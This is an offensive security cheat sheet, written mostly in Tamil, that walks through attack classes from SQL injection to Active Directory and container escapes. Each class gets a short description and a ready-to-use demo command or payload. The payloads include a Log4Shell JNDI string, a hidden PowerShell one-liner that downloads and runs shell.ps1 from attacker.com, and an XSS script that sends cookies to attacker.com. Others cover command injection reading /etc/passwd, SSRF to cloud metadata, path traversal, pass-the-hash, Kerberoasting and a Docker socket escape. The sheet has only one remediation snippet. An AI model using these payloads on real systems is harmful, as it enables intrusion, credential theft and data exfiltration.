1. இன்ஜெக்ஷன் தாக்குதல்கள் (Injection Attacks)

SQL Injection (SQLi)

வலைப்பக்கத்தின் உள்ளீடுகள் மூலம் தீங்கிழைக்கும் SQL குறியீடுகளை புகுத்தி தரவுத்தளத்தை கட்டுப்படுத்துதல்.

Error-based / Union-based / Blind / Time-based / Out-of-band: தரவுத்தளத்தின் பதில்கள் மற்றும் நேர தாமதங்களை வைத்து தகவல்களை திருடுவது.
Demo Command (sqlmap): 
# தானியங்கி முறையில் தரவுத்தளத்தை கண்டறிய
sqlmap -u "http://target.com/item.php?id=1" --dbs --batch
பாதுகாப்பான குறியீடு (Remediation) - PHP PDO: 
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $userInput]);

Command Injection & Argument Injection

OS Command Injection: வெப் அப்ளிகேஷன் வழியாக சர்வரின் ஆப்பரேட்டிங் சிஸ்டம் கட்டளைகளை இயக்குவது.

Argument Injection: ஏற்கனவே இயங்கும் ஒரு பயன்பாட்டின் அர்குமெண்டுகளை (Flags) மாற்றி அமைப்பது.

Demo Payload (Web Input Box): 
; cat /etc/passwd # அல்லது விண்டோஸில் & whoami

Template & Language Injections (SSTI, CSTI, EL, LDAP, XPath, NoSQL)

டெம்ப்ளேட் எஞ்சின்கள் (SSTI), எக்ஸ்பிரஷன் லாங்குவேஜ்கள் (SpEL), மற்றும் NoSQL (MongoDB) போன்ற கட்டமைப்புகளில் உள்ளீடுகளை மாற்றுவது.

NoSQL Login Bypass Payload: 
{"username": {"$gt": ""}, "password": {"$gt": ""}}

Log4Shell (CVE-2021-44228) & Spring4Shell

ஜாவா லாகிங் லைப்ரரிகளில் (Log4j) உள்ள குறைபாட்டை பயன்படுத்தி RCE பெறுவது.

Demo Payload (User-Agent or Input): 
${jndi:ldap://attacker.com/exploit}

CRLF, Header, IMAP, SMTP, OGNL, JNDI, SSI Injection

மின்னஞ்சல் நெறிமுறைகள் மற்றும் சர்வர் ஹெடர்களில் \r\n குறியீடுகளை புகுத்தி ஏமாற்றுவது.

2. குறியீடு இயக்குதல் தாக்குதல்கள் (Code Execution Attacks)

Remote Code Execution (RCE) & Local Code Execution (LCE)

சர்வரில் தன்னிச்சையான கோப்புகளையோ அல்லது கணினி கட்டளைகளையோ தூரத்திலிருந்து இயக்குவது.

Demo Command (Netcat Reverse Shell Listener): 
nc -lvnp 4444

Deserialization & Dynamic Code Execution

Deserialization (Java, .NET, PHP, Python Pickle, Ruby Marshal): பைட்டுகளாக இருக்கும் ஆப்ஜெக்ட்டுகளை மீண்டும் மாற்றும்போது மால்வேர்களை இயக்குவது.

Demo Command (ysoserial for Java Deserialization): 
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

Script-based Execution & Interpreter Abuse

கணினியில் இருக்கும் PowerShell, Bash, VBScript, JScript, Python, Perl, Ruby போன்ற இன்டர்பிரெட்டர்களை ஹேக்கர்கள் பயன்படுத்துவது.

Demo Command (PowerShell One-Liner): 
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

Memory Corruption (Buffer/Heap/Stack Overflow, UAF, ROP, JOP, Format String)

C/C++ மொழிகளில் எழுதப்பட்ட மென்பொருள்களின் நினைவகத்தை (Memory) சிதைத்து சிஸ்டத்தை கைப்பற்றுவது.

Demo Pattern (Buffer Overflow Fuzzing): 
python3 -c "print('A' * 1000)" | ./vulnerable_program

3. கோப்பு சார்ந்த தாக்குதல்கள் (File-Based Attacks)

Malicious Office Macros (VBA, XLM 4.0, DDE), RTF & PDF Exploits

வேர்ட், எக்செல் அல்லது பிடிஎஃப் கோப்புகளை திறக்கும்போது பின்னணியில் மால்வேர்களை இயங்க வைப்பது.

LNK, CHM, HTA Abuse, Zip Slip, Zip Bomb, Polyglots, Steganography, ADS

Zip Slip: அன்சிப் செய்யும்போது கோப்புகளை தவறான பாதையில் எழுத வைப்பது.

Alternate Data Streams (ADS): விண்டோஸில் ஒரு சாதாரண டெக்ஸ்ட் கோப்பிற்கு பின்னால் மால்வேரை ஒளித்து வைப்பது.

Demo Command (Windows ADS Creation): 
type malware.exe > normal.txt:hidden.exe

4. வலைப்பக்க தாக்குதல்கள் (Web Application Attacks)

Cross-Site Scripting (XSS)

Reflected / Stored / DOM / mXSS / Blind XSS: பயனர்களின் பிரௌசர்களில் தீங்கிழைக்கும் ஜாவாஸ்கிரிப்ட் குறியீடுகளை இயக்குவது.

Demo Payload: 
<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>

CSRF & Server-Side Request Forgery (SSRF)

SSRF to IMDS: கிளவுட் சர்வர் மூலமாக அதன் உள்வட்ட கிளவுட் மெட்டாடேட்டாவை திருடுதல்.

Demo SSRF Payload (Targeting AWS Metadata): 
http://target.com/preview?url=http://169.254.169.254/latest/meta-data/

Path Traversal, LFI, RFI & File Upload Bypass

LFI: சர்வரில் உள்ள உள்வட்ட கோப்புகளை இணையதளம் வழியாக வாசிப்பது.

Demo LFI Payload: 
http://target.com/page.php?file=../../../../etc/passwd

IDOR, Broken Access Control, Authentication, Session Fixation

அணுகல் கட்டுப்பாட்டு தவறுகளை பயன்படுத்தி பிற பயனர்களின் கணக்குகளை முடக்குவது.

Niche Web Attacks (Cache Poisoning, Prototype Pollution, Dependency Confusion, Clickjacking, CORS, JWT, GraphQL, WebSockets)

நவீன வலைப்பக்க கட்டமைப்புகளான ஜேடபிள்யூடி (JWT), கிராப்கியூஎல் (GraphQL) மற்றும் வெப்சாக்கெட்டுகளில் நடக்கும் மேம்பட்ட தாக்குதல்கள்.

5. உள்கட்டமைப்பு மற்றும் கணினி தாக்குதல்கள் (Infrastructure & System)

Process Injection (DLL, PE, Process Hollowing, Thread Hijacking, APC, AtomBombing)

பாதுகாப்பான ஒரு கணினி ப்ராசஸிற்குள் மால்வேர் குறியீடுகளை உட்செலுத்தி ஆன்டிவைரஸை ஏமாற்றுவது.

Living-off-the-Land (LOLBAS / GTFOBins)

கணினியில் ஏற்கனவே இருக்கும் நம்பகமான டூல்களை தவறாக பயன்படுத்துவது.

Demo Command (GTFOBins - SUID Privilege Escalation via 'less'): 
less /etc/passwd
!/bin/sh # less-க்குள் இருந்து ரூட் ஷெல் பெறுவது

Privilege Escalation, Persistence & Lateral Movement

Pass-the-Hash (PtH): பாஸ்வேர்டு இல்லமால் அதன் ஹாஷ்-ஐ மட்டும் வைத்து நெட்வொர்க்கில் உள்ள பிற கணினிகளுக்குள் நுழைவது.

Demo Command (CrackMapExec PtH): 
crackmapexec smb 192.168.1.0/24 -u Administrator -H "admin_ntlm_hash_here"

Defense Evasion, Discovery, Collection, Exfiltration, C2, Supply Chain, Hardware

Timestomping: கோப்புகளின் தேதியை மாற்றுவது. DNS Tunneling: டிஎன்எஸ் கோரிக்கைகள் வழியாக நிறுவனத்தின் ரகசிய தரவுகளை வெளியே கடத்துவது (Exfiltration).

6. ஆக்டிவ் டைரக்டரி மற்றும் கிளவுட் தாக்குதல்கள் (Active Directory & Cloud)

Active Directory (Kerberoasting, AS-REP Roasting, DCSync, LSASS Dumping)

விண்டோஸ் ஆக்டிவ் டைரக்டரி நெட்வொர்க்கை முழுமையாக கைப்பற்றுதல்.

Demo Command (Impacket Kerberoasting): 
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 domain.local/user

ADCS Abuse (ESC1 to ESC8) & Certifried

Active Directory Certificate Services-ல் உள்ள தவறான உள்ளமைவுகளை பயன்படுத்தி டொமைன் அட்மினாக மாறுவது.

Cloud & Container Escape (Docker, Kubernetes Abuse)

டாக்கர் கன்டெய்னரில் இருந்து நிஜ சர்வர் ஹோஸ்டிற்குள் தப்பிப்பது.

Demo Command (Docker Socket Escape Check): 
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host

7. ஏபிஐ மற்றும் மேம்பட்ட குறைபாடுகள் (API & Advanced Flaws)

API Attacks (BOLA, BFLA, Rate Limit Bypass, SAML, XML Wrapping)

BOLA / IDOR: ஏபிஐ கோரிக்கைகளில் ஐடிகளை மாற்றி பிற பயனர் தரவை எடுத்தல்.

Demo API Request Modification: 
GET /api/v1/profile?user_id=1002 HTTP/1.1 # 1001 லிருந்து 1002 ஆக மாற்றுதல்

Race Condition, Business Logic Flaws, DevOps (CI/CD Poisoning, Secrets in IaC)

TOCTOU / Race Condition: ஒரே மில்லிசெகண்டில் இரண்டு கோரிக்கைகளை அனுப்பி பணப்பரிமாற்றம் அல்லது கூப்பன்களை இருமுறை பயன்படுத்துவது.

CI/CD Pipeline Poisoning: GitHub Actions கோப்புகளில் repository_dispatch அல்லது மலீசியஸ் புல் ரிக்வெஸ்ட் மூலம் சீக்ரெட் கீகளை திருடுவது.
